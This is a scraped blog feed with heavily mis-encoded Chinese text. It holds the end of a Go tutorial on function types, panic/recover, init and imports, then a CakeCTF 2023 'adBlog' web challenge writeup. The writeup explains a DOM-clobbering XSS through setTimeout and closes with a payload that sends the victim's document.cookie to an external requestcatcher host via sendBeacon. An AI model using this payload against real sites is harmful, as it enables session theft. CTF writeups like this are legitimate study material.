f testInt)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> result []<span class="type">int</span></span><br><span class="line">	<span class="keyword">for</span> _, value := <span class="keyword">range</span> slice &#123;</span><br><span class="line">		<span class="keyword">if</span> f(value) &#123;</span><br><span class="line">			result = <span class="built_in">append</span>(result, value)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	slice := []<span class="type">int</span> &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;slice = &quot;</span>, slice)</span><br><span class="line">	odd := filter(slice, isOdd)    <span class="comment">// å‡½æ•°å½“åšå€¼æ¥ä¼ é€’äº†</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;Odd elements of slice are: &quot;</span>, odd)</span><br><span class="line">	even := filter(slice, isEven)  <span class="comment">// å‡½æ•°å½“åšå€¼æ¥ä¼ é€’äº†</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;Even elements of slice are: &quot;</span>, even)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‡½æ•°å½“åšå€¼å’Œç±»å‹åœ¨æˆ‘ä»¬å†™ä¸€äº›é€šç”¨æ¥å£çš„æ—¶å€™éå¸¸æœ‰ç”¨ï¼Œé€šè¿‡ä¸Šé¢ä¾‹å­æˆ‘ä»¬çœ‹åˆ°<code>testInt</code>è¿™ä¸ªç±»å‹æ˜¯ä¸€ä¸ªå‡½æ•°ç±»å‹ï¼Œç„¶åä¸¤ä¸ª<code>filter</code>å‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼ä¸<code>testInt</code>ç±»å‹æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å®ç°å¾ˆå¤šç§çš„é€»è¾‘ï¼Œè¿™æ ·ä½¿å¾—æˆ‘ä»¬çš„ç¨‹åºå˜å¾—éå¸¸çš„çµæ´»ã€‚</p>
<h3 id="panicå’Œrecover"><a class="markdownIt-Anchor" href="#panicå’Œrecover"></a> Panicå’ŒRecover</h3>
<p>Goæ²¡æœ‰åƒJavaé‚£æ ·çš„å¼‚å¸¸æœºåˆ¶ï¼Œå®ƒä¸èƒ½æŠ›å‡ºå¼‚å¸¸ï¼Œè€Œæ˜¯ä½¿ç”¨äº†<code>panic</code>å’Œ<code>recover</code>æœºåˆ¶ã€‚ä¸€å®šè¦è®°ä½ï¼Œä½ åº”å½“æŠŠå®ƒä½œä¸ºæœ€åçš„æ‰‹æ®µæ¥ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ çš„ä»£ç ä¸­åº”å½“æ²¡æœ‰ï¼Œæˆ–è€…å¾ˆå°‘æœ‰<code>panic</code>çš„ä¸œè¥¿ã€‚è¿™æ˜¯ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œè¯·æ˜æ™ºåœ°ä½¿ç”¨å®ƒã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•ä½¿ç”¨å®ƒå‘¢ï¼Ÿ</p>
<p>Panic</p>
<blockquote>
<p>æ˜¯ä¸€ä¸ªå†…å»ºå‡½æ•°ï¼Œå¯ä»¥ä¸­æ–­åŸæœ‰çš„æ§åˆ¶æµç¨‹ï¼Œè¿›å…¥ä¸€ä¸ª<code>panic</code>çŠ¶æ€ä¸­ã€‚å½“å‡½æ•°<code>F</code>è°ƒç”¨<code>panic</code>ï¼Œå‡½æ•°Fçš„æ‰§è¡Œè¢«ä¸­æ–­ï¼Œä½†æ˜¯<code>F</code>ä¸­çš„å»¶è¿Ÿå‡½æ•°ä¼šæ­£å¸¸æ‰§è¡Œï¼Œç„¶åFè¿”å›åˆ°è°ƒç”¨å®ƒçš„åœ°æ–¹ã€‚åœ¨è°ƒç”¨çš„åœ°æ–¹ï¼Œ<code>F</code>çš„è¡Œä¸ºå°±åƒè°ƒç”¨äº†<code>panic</code>ã€‚è¿™ä¸€è¿‡ç¨‹ç»§ç»­å‘ä¸Šï¼Œç›´åˆ°å‘ç”Ÿ<code>panic</code>çš„<code>goroutine</code>ä¸­æ‰€æœ‰è°ƒç”¨çš„å‡½æ•°è¿”å›ï¼Œæ­¤æ—¶ç¨‹åºé€€å‡ºã€‚<code>panic</code>å¯ä»¥ç›´æ¥è°ƒç”¨<code>panic</code>äº§ç”Ÿã€‚ä¹Ÿå¯ä»¥ç”±è¿è¡Œæ—¶é”™è¯¯äº§ç”Ÿï¼Œä¾‹å¦‚è®¿é—®è¶Šç•Œçš„æ•°ç»„ã€‚</p>
</blockquote>
<p>Recover</p>
<blockquote>
<p>æ˜¯ä¸€ä¸ªå†…å»ºçš„å‡½æ•°ï¼Œå¯ä»¥è®©è¿›å…¥<code>panic</code>çŠ¶æ€çš„<code>goroutine</code>æ¢å¤è¿‡æ¥ã€‚<code>recover</code>ä»…åœ¨å»¶è¿Ÿå‡½æ•°ä¸­æœ‰æ•ˆã€‚åœ¨æ­£å¸¸çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨<code>recover</code>ä¼šè¿”å›<code>nil</code>ï¼Œå¹¶ä¸”æ²¡æœ‰å…¶å®ƒä»»ä½•æ•ˆæœã€‚å¦‚æœå½“å‰çš„<code>goroutine</code>é™·å…¥<code>panic</code>çŠ¶æ€ï¼Œè°ƒç”¨<code>recover</code>å¯ä»¥æ•è·åˆ°<code>panic</code>çš„è¾“å…¥å€¼ï¼Œå¹¶ä¸”æ¢å¤æ­£å¸¸çš„æ‰§è¡Œã€‚</p>
</blockquote>
<p>ä¸‹é¢è¿™ä¸ªå‡½æ•°æ¼”ç¤ºäº†å¦‚ä½•åœ¨è¿‡ç¨‹ä¸­ä½¿ç”¨<code>panic</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> user = os.Getenv(<span class="string">&quot;USER&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> user == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">&quot;no value for $USER&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢è¿™ä¸ªå‡½æ•°æ£€æŸ¥ä½œä¸ºå…¶å‚æ•°çš„å‡½æ•°åœ¨æ‰§è¡Œæ—¶æ˜¯å¦ä¼šäº§ç”Ÿ<code>panic</code>ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">throwsPanic</span><span class="params">(f <span class="keyword">func</span>()</span></span>) (b <span class="type">bool</span>) &#123;</span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> x := <span class="built_in">recover</span>(); x != <span class="literal">nil</span> &#123;</span><br><span class="line">			b = <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	f() <span class="comment">//æ‰§è¡Œå‡½æ•°fï¼Œå¦‚æœfä¸­å‡ºç°äº†panicï¼Œé‚£ä¹ˆå°±å¯ä»¥æ¢å¤å›æ¥</span></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="mainå‡½æ•°å’Œinitå‡½æ•°"><a class="markdownIt-Anchor" href="#mainå‡½æ•°å’Œinitå‡½æ•°"></a> <code>main</code>å‡½æ•°å’Œ<code>init</code>å‡½æ•°</h3>
<p>Goé‡Œé¢æœ‰ä¸¤ä¸ªä¿ç•™çš„å‡½æ•°ï¼š<code>init</code>å‡½æ•°ï¼ˆèƒ½å¤Ÿåº”ç”¨äºæ‰€æœ‰çš„<code>package</code>ï¼‰å’Œ<code>main</code>å‡½æ•°ï¼ˆåªèƒ½åº”ç”¨äº<code>package main</code>ï¼‰ã€‚è¿™ä¸¤ä¸ªå‡½æ•°åœ¨å®šä¹‰æ—¶ä¸èƒ½æœ‰ä»»ä½•çš„å‚æ•°å’Œè¿”å›å€¼ã€‚è™½ç„¶ä¸€ä¸ª<code>package</code>é‡Œé¢å¯ä»¥å†™ä»»æ„å¤šä¸ª<code>init</code>å‡½æ•°ï¼Œä½†è¿™æ— è®ºæ˜¯å¯¹äºå¯è¯»æ€§è¿˜æ˜¯ä»¥åçš„å¯ç»´æŠ¤æ€§æ¥è¯´ï¼Œæˆ‘ä»¬éƒ½å¼ºçƒˆå»ºè®®ç”¨æˆ·åœ¨ä¸€ä¸ª<code>package</code>ä¸­æ¯ä¸ªæ–‡ä»¶åªå†™ä¸€ä¸ª<code>init</code>å‡½æ•°ã€‚</p>
<p>Goç¨‹åºä¼šè‡ªåŠ¨è°ƒç”¨<code>init()</code>å’Œ<code>main()</code>ï¼Œæ‰€ä»¥ä½ ä¸éœ€è¦åœ¨ä»»ä½•åœ°æ–¹è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°ã€‚æ¯ä¸ª<code>package</code>ä¸­çš„<code>init</code>å‡½æ•°éƒ½æ˜¯å¯é€‰çš„ï¼Œä½†<code>package main</code>å°±å¿…é¡»åŒ…å«ä¸€ä¸ª<code>main</code>å‡½æ•°ã€‚</p>
<p>ç¨‹åºçš„åˆå§‹åŒ–å’Œæ‰§è¡Œéƒ½èµ·å§‹äº<code>main</code>åŒ…ã€‚å¦‚æœ<code>main</code>åŒ…è¿˜å¯¼å…¥äº†å…¶å®ƒçš„åŒ…ï¼Œé‚£ä¹ˆå°±ä¼šåœ¨ç¼–è¯‘æ—¶å°†å®ƒä»¬ä¾æ¬¡å¯¼å…¥ã€‚æœ‰æ—¶ä¸€ä¸ªåŒ…ä¼šè¢«å¤šä¸ªåŒ…åŒæ—¶å¯¼å…¥ï¼Œé‚£ä¹ˆå®ƒåªä¼šè¢«å¯¼å…¥ä¸€æ¬¡ï¼ˆä¾‹å¦‚å¾ˆå¤šåŒ…å¯èƒ½éƒ½ä¼šç”¨åˆ°<code>fmt</code>åŒ…ï¼Œä½†å®ƒåªä¼šè¢«å¯¼å…¥ä¸€æ¬¡ï¼Œå› ä¸ºæ²¡æœ‰å¿…è¦å¯¼å…¥å¤šæ¬¡ï¼‰ã€‚å½“ä¸€ä¸ªåŒ…è¢«å¯¼å…¥æ—¶ï¼Œå¦‚æœè¯¥åŒ…è¿˜å¯¼å…¥äº†å…¶å®ƒçš„åŒ…ï¼Œé‚£ä¹ˆä¼šå…ˆå°†å…¶å®ƒåŒ…å¯¼å…¥è¿›æ¥ï¼Œç„¶åå†å¯¹è¿™äº›åŒ…ä¸­çš„åŒ…çº§å¸¸é‡å’Œå˜é‡è¿›è¡Œåˆå§‹åŒ–ï¼Œæ¥ç€æ‰§è¡Œ<code>init</code>å‡½æ•°ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ï¼Œä¾æ¬¡ç±»æ¨ã€‚ç­‰æ‰€æœ‰è¢«å¯¼å…¥çš„åŒ…éƒ½åŠ è½½å®Œæ¯•äº†ï¼Œå°±ä¼šå¼€å§‹å¯¹<code>main</code>åŒ…ä¸­çš„åŒ…çº§å¸¸é‡å’Œå˜é‡è¿›è¡Œåˆå§‹åŒ–ï¼Œç„¶åæ‰§è¡Œ<code>main</code>åŒ…ä¸­çš„<code>init</code>å‡½æ•°ï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰ï¼Œæœ€åæ‰§è¡Œ<code>main</code>å‡½æ•°ã€‚ä¸‹å›¾è¯¦ç»†åœ°è§£é‡Šäº†æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹ï¼š</p>
<p><img src="/2023/12/golang%E5%AD%A6%E4%B9%A0%E4%B9%8B-%E6%B5%81%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0/init.png" alt="init"></p>
<p>ä¸Šå›¾ mainå‡½æ•°å¼•å…¥åŒ…åˆå§‹åŒ–æµç¨‹å›¾</p>
<h3 id="import"><a class="markdownIt-Anchor" href="#import"></a> import</h3>
<p>æˆ‘ä»¬åœ¨å†™Goä»£ç çš„æ—¶å€™ç»å¸¸ç”¨åˆ°importè¿™ä¸ªå‘½ä»¤ç”¨æ¥å¯¼å…¥åŒ…æ–‡ä»¶ï¼Œè€Œæˆ‘ä»¬ç»å¸¸çœ‹åˆ°çš„æ–¹å¼å‚è€ƒå¦‚ä¸‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>(</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>ç„¶åæˆ‘ä»¬ä»£ç é‡Œé¢å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„æ–¹å¼è°ƒç”¨</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢è¿™ä¸ªfmtæ˜¯Goè¯­è¨€çš„æ ‡å‡†åº“ï¼Œå…¶å®æ˜¯å»<code>GOROOT</code>ç¯å¢ƒå˜é‡æŒ‡å®šç›®å½•ä¸‹å»åŠ è½½è¯¥æ¨¡å—ï¼Œå½“ç„¶Goçš„importè¿˜æ”¯æŒå¦‚ä¸‹ä¸¤ç§æ–¹å¼æ¥åŠ è½½è‡ªå·±å†™çš„æ¨¡å—ï¼š</p>
<ol>
<li>
<p>ç›¸å¯¹è·¯å¾„</p>
<p>import â€œ./modelâ€ //å½“å‰æ–‡ä»¶åŒä¸€ç›®å½•çš„modelç›®å½•ï¼Œä½†æ˜¯ä¸å»ºè®®è¿™ç§æ–¹å¼æ¥import</p>
</li>
<li>
<p>ç»å¯¹è·¯å¾„</p>
<p>import â€œshorturl/modelâ€ //åŠ è½½gopath/src/shorturl/modelæ¨¡å—</p>
</li>
</ol>
<p>ä¸Šé¢å±•ç¤ºäº†ä¸€äº›importå¸¸ç”¨çš„å‡ ç§æ–¹å¼ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„importï¼Œè®©å¾ˆå¤šæ–°æ‰‹å¾ˆè´¹è§£ï¼Œä¸‹é¢æˆ‘ä»¬æ¥ä¸€ä¸€è®²è§£ä¸€ä¸‹åˆ°åº•æ˜¯æ€ä¹ˆä¸€å›äº‹</p>
<ol>
<li>
<p>ç‚¹æ“ä½œ</p>
<p>æˆ‘ä»¬æœ‰æ—¶å€™ä¼šçœ‹åˆ°å¦‚ä¸‹çš„æ–¹å¼å¯¼å…¥åŒ…</p>
<p>import(<br>
. â€œfmtâ€<br>
)</p>
<p>è¿™ä¸ªç‚¹æ“ä½œçš„å«ä¹‰å°±æ˜¯è¿™ä¸ªåŒ…å¯¼å…¥ä¹‹ååœ¨ä½ è°ƒç”¨è¿™ä¸ªåŒ…çš„å‡½æ•°æ—¶ï¼Œä½ å¯ä»¥çœç•¥å‰ç¼€çš„åŒ…åï¼Œä¹Ÿå°±æ˜¯å‰é¢ä½ è°ƒç”¨çš„<code>fmt.Println(&quot;hello world&quot;)</code>å¯ä»¥çœç•¥çš„å†™æˆ<code>Println(&quot;hello world&quot;)</code></p>
</li>
<li>
<p>åˆ«åæ“ä½œ</p>
<p>åˆ«åæ“ä½œé¡¾åæ€ä¹‰æˆ‘ä»¬å¯ä»¥æŠŠåŒ…å‘½åæˆå¦ä¸€ä¸ªæˆ‘ä»¬ç”¨èµ·æ¥å®¹æ˜“è®°å¿†çš„åå­—</p>
<p>import(<br>
f â€œfmtâ€<br>
)</p>
<p>åˆ«åæ“ä½œçš„è¯è°ƒç”¨åŒ…å‡½æ•°æ—¶å‰ç¼€å˜æˆäº†æˆ‘ä»¬çš„å‰ç¼€ï¼Œå³f.Println(â€œhello worldâ€)</p>
</li>
<li>
<p>_æ“ä½œ</p>
<p>è¿™ä¸ªæ“ä½œç»å¸¸æ˜¯è®©å¾ˆå¤šäººè´¹è§£çš„ä¸€ä¸ªæ“ä½œç¬¦ï¼Œè¯·çœ‹ä¸‹é¢è¿™ä¸ªimport</p>
</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;database/sql&quot;</span></span><br><span class="line">    _ <span class="string">&quot;github.com/ziutek/mymysql/godrv&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<pre><code>_æ“ä½œå…¶å®æ˜¯å¼•å…¥è¯¥åŒ…ï¼Œè€Œä¸ç›´æ¥ä½¿ç”¨åŒ…é‡Œé¢çš„å‡½æ•°ï¼Œè€Œæ˜¯è°ƒç”¨äº†è¯¥åŒ…é‡Œé¢çš„initå‡½æ•°ã€‚
</code></pre>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>CakeCTF2023-[web]-adBlog-ä¸ªäººWriteup</title>
    <url>/2023/11/CakeCTF2023-web-adBlog-%E4%B8%AA%E4%BA%BAWriteup/</url>
    <content><![CDATA[<p>æ—¥å¸¸åšä¸å‡ºç­¾åˆ°é¢˜ï¼Œä¸€åœºæ—¥æœ¬çš„CTFï¼Œæ„Ÿè§‰é¢˜ç›®éš¾åº¦éƒ½ä¸å¤§ï¼Œå°±æ˜¯è‡ªå·±å¤ªèœäº†ã€‚</p>
<span id="more"></span>
<h1 id="webadblog"><a class="markdownIt-Anchor" href="#webadblog"></a> [web]adBlog</h1>
<p>è®¿é—®é¢˜ç›®é“¾æ¥<a href="http://adblog.2023.cakectf.com:8001">http://adblog.2023.cakectf.com:8001</a></p>
<p>èƒ½å¾—åˆ°è¿™ä¹ˆä¸€ä¸ªç•Œé¢ï¼š<img src="/2023/11/CakeCTF2023-web-adBlog-%E4%B8%AA%E4%BA%BAWriteup/image-20231112202229481.png" alt="image-20231112202229481"></p>
<p>ç¬¬ä¸€æ—¶é—´æƒ³çš„å°±æ˜¯ï¼Œè¿™æ˜¯ä¸€ä¸ªXSSï¼Œè¯ä¸å¤šè¯´ç›´æ¥å¼€æµ‹ï¼Œæ„é€ ä¸€ä¸ª<code>&lt;img src=&quot;CakeCTF2023-web-adBlog-ä¸ªäººWriteup/twe1v3.requestcatcher.com&quot; /&gt;</code>ï¼Œåœ¨<a href="https://twe1v3.requestcatcher.com/%E8%83%BD%E5%A4%9F%E6%8E%A5%E6%94%B6%E5%88%B0">https://twe1v3.requestcatcher.com/èƒ½å¤Ÿæ¥æ”¶åˆ°</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: twe1v3.<span class="property">requestcatcher</span>.<span class="property">com</span></span><br><span class="line"><span class="title class_">Accept</span>: image/avif,image/webp,*<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment">Referer: http://adblog.2023.cakectf.com:8001/</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: image</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: no-cors</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: cross-site</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span></span><br></pre></td></tr></table></figure>
<p>å›æ˜¾æˆåŠŸï¼Œèƒ½åˆæ­¥åˆ¤å®šå°±æ˜¯ä¸ªXSSï¼Œæ¥ä¸‹æ¥å°±æ˜¯é™·å…¥è‡ªå·±çš„é€»è¾‘æ€ªåœˆï¼Œæºç ä¹Ÿä¸çœ‹ï¼Œå°±æé‚£ç›²æµ‹ï¼ˆå®é™…åšé¢˜çŠ¶æ€ï¼‰ã€‚å›å½’æ­£è§„ï¼Œé¢˜ç›®ç»™äº†æ•´ä¸ªæ¡†æ¶çš„æºç ï¼Œè¿™ä¸€ç‚¹å›½å¤–è¿˜æ˜¯å¾ˆèˆå¾—çš„<sub>_</sub>ã€‚</p>
<p><img src="/2023/11/CakeCTF2023-web-adBlog-%E4%B8%AA%E4%BA%BAWriteup/image-20231112220659402-16997980224843.png" alt="image-20231112220659402"></p>
<p>ç®€å•çœ‹ä¸‹æ¥æœ‰å‡ ä¸ªæ”¶è·ï¼šå­˜åœ¨ä¸‰ä¸ªé¡µé¢ï¼Œ<strong>åŒæ—¶reportèƒ½å¤Ÿå‘ç®¡ç†å‘˜(admin)å‘é€æ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯è¯´èƒ½å¤Ÿé€šè¿‡reportæ¥å£æ¥æ”¶adminçš„è¿”å›çš„cookieå€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„flagçš„å€¼ã€‚</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">service</span><br><span class="line">  8001ç«¯å£ï¼šindex.htmlã€blog.html</span><br><span class="line">report</span><br><span class="line">  8002ç«¯å£ï¼šindex.html</span><br></pre></td></tr></table></figure>
<p><a href="http://xn--app-g88dr55pi7litp.py">è€Œä¸»è¦çš„app.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">REDIS_HOST = os.getenv(<span class="string">&quot;REDIS_HOST&quot;</span>, <span class="string">&quot;redis&quot;</span>)</span><br><span class="line">REDIS_PORT = <span class="built_in">int</span>(os.getenv(<span class="string">&quot;REDIS_PORT&quot;</span>, <span class="string">&quot;6379&quot;</span>))</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    blog_id = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line">    title = flask.request.form.get(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;untitled&#x27;</span>)</span><br><span class="line">    content = flask.request.form.get(<span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;&lt;i&gt;empty post&lt;/i&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(title) &gt; <span class="number">128</span> <span class="keyword">or</span> <span class="built_in">len</span>(content) &gt; <span class="number">1024</span>*<span class="number">1024</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.render_template(<span class="string">&quot;index.html&quot;</span>,</span><br><span class="line">                                     msg=<span class="string">&quot;Too long title or content.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    db().<span class="built_in">set</span>(blog_id, json.dumps(&#123;<span class="string">&#x27;title&#x27;</span>: title, <span class="string">&#x27;content&#x27;</span>: content&#125;))</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">f&quot;/blog/<span class="subst">&#123;blog_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blog/&lt;blog_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blog</span>(<span class="params">blog_id</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">&quot;^[0-9a-f]&#123;64&#125;$&quot;</span>, blog_id):</span><br><span class="line">        <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    blog = db().get(blog_id)</span><br><span class="line">    <span class="keyword">if</span> blog <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    blog = json.loads(blog)</span><br><span class="line">    title = blog[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">    content = base64.b64encode(blog[<span class="string">&#x27;content&#x27;</span>].encode()).decode()</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&quot;blog.html&quot;</span>, title=title, content=content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(flask.g, <span class="string">&#x27;_redis&#x27;</span>, <span class="literal">None</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        flask.g._redis = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, db=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> flask.g._redis</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç»™å‡ºäº†blog_idçš„ç”Ÿæˆæ–¹å¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blog_id = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure>
<p>å¾€ä¸‹èµ°ï¼Œæ¥åˆ°æœ€å¼€å§‹çš„<code>adblog\service\templates\blog.html</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> content = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="title function_">atob</span>(<span class="string">&quot;&#123;&#123; content &#125;&#125;&quot;</span>));</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>).<span class="property">innerHTML</span> = content;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">detectAdBlock</span>()) &#123;</span><br><span class="line">        showOverlay = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;ad-overlay&quot;</span>).<span class="property">style</span>.<span class="property">width</span> = <span class="string">&quot;100%&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> showOverlay === <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;ad&quot;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;block&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(showOverlay, <span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„ä¸»è¦æ„æ€è¿˜æ˜¯adblockæ£€æµ‹ä»£ç åçš„è¡Œä¸ºï¼Œæ²¡æƒ³åˆ°æ˜¯æ‰“adblockçš„å†…ç½®å‚æ•°æ¥æ„é€ XSS</p>
<p>å¦‚æœç”¨<mark>setInterval</mark>æ’å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚<br>
<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/setTimeout">åŒæ ·ï¼ŒsetTimeoutä¹Ÿå¯ä»¥ç”¨å­—ç¬¦ä¸²æ¥æ‰§è¡Œã€‚</a>è¿™é‡Œä¼šåœ¨ä¸‹é¢è¿›è¡Œè¯¦ç»†è®²è§£ã€‚æ¢å¥è¯è¯´ï¼Œæ‚¨éœ€è¦å°†javascript<code>setTimeout(showOverlay, 1000);</code>ä»£ç æ”¾å…¥<mark>showOverlay</mark>ä¸­æ‰èƒ½è¿è¡Œå®ƒã€‚ä¸‹é¢å°±æ˜¯æ„å»ºèƒ½å¤Ÿè§¦å‘çš„payloadï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt; a id = showOverlay href = &quot;cid:navigator.sendBeacon(&#x27;https://[yours].requestcatcher.com/test&#x27;,document.cookie);&quot; &gt;<span class="tag">&lt;/<span class="name">ä¸€</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
